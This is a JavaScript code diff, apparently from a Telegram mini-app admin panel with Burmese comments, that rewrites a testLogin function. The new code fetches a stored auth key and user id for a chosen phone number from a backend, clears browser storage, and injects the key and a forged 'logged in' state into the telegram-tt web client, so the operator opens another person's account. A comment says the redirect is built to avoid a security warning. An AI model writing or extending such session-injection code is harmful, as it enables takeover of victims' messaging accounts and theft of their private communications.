@@ -292,10 +292,71 @@ result.sessions.forEach((session, index) => {
             }
         }
 
-       function testLogin(phoneNumber) {
+       async function testLogin(phoneNumber) {
     tg.HapticFeedback?.impactOccurred?.('medium');
-    const ttUrl = `/?login_phone=${encodeURIComponent(phoneNumber)}`;
-    window.location.href = ttUrl;
+    document.getElementById('session-list').innerHTML = "<span style='color:#00ffcc;'>Mission Synchronizing... Preparing Terminal...</span>";
+
+    try {
+        // ၁။ Backend မှ Session နှင့် User ID ကို လှမ်းယူခြင်း
+        const response = await fetch('/api/admin/get-tt-session', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ userId: ADMIN_ID, phoneNumber: phoneNumber })
+        });
+        
+        const data = await response.json();
+        
+        if (data.success && data.dcId && data.authKeyHex && data.userId) {
+            // Hex ကို Byte Array ပြောင်းခြင်း
+            const hexToArray = (hex) => {
+                const result = [];
+                for (let i = 0; i < hex.length; i += 2) {
+                    result.push(parseInt(hex.substring(i, i + 2), 16));
+                }
+                return result;
+            };
+            
+            const authKeyArray = hexToArray(data.authKeyHex);
+            
+            // ၂။ Storage အဟောင်းများကို ရှင်းလင်းခြင်း (QR Code အဟောင်းများ ဖျက်ရန်)
+            localStorage.clear();
+            sessionStorage.clear();
+            
+            // ၃။ Auth Key အသစ်ကို ဤနေရာမှနေ၍ Storage သို့ တိုက်ရိုက်သွင်းခြင်း
+            localStorage.setItem('dc', String(data.dcId));
+            localStorage.setItem(`dc${data.dcId}_auth_key`, JSON.stringify(authKeyArray));
+            
+            // ၄။ 🌟 [အရေးကြီးဆုံး] telegram-tt အတွက် ပြီးပြည့်စုံသော Global State တည်ဆောက်ခြင်း 🌟
+            const globalState = {
+                auth: {
+                    state: "authorizationStateReady", // Login ဝင်ပြီးကြောင်း သတ်မှတ်သည်
+                    phoneNumber: phoneNumber
+                },
+                currentUserId: String(data.userId), // User ID အတိအကျ ထည့်ပေးသည်
+                settings: {
+                    byKey: {
+                        theme: "dark",
+                        language: "en",
+                        messageTextSize: 16,
+                        animationLevel: 1,
+                        messageSendKeycombo: "enter"
+                    }
+                }
+            };
+            localStorage.setItem('tt-global-state', JSON.stringify(globalState));
+            
+            alert("Mission Synchronized! Connecting to Agent Terminal...");
+            
+            // ၅။ 🌟 URL တွင် Parameter လုံးဝမပါဘဲ Main App သို့ ကူးပြောင်းခြင်း (Microsoft Warning မတက်စေရန်) 🌟
+            window.location.replace('/');
+        } else {
+            alert("Session extraction failed! Database may be incomplete.");
+            window.location.reload();
+        }
+    } catch (error) {
+        alert("Network Error: Cannot connect to database.");
+        window.location.reload();
+    }
 }
     
     </script>
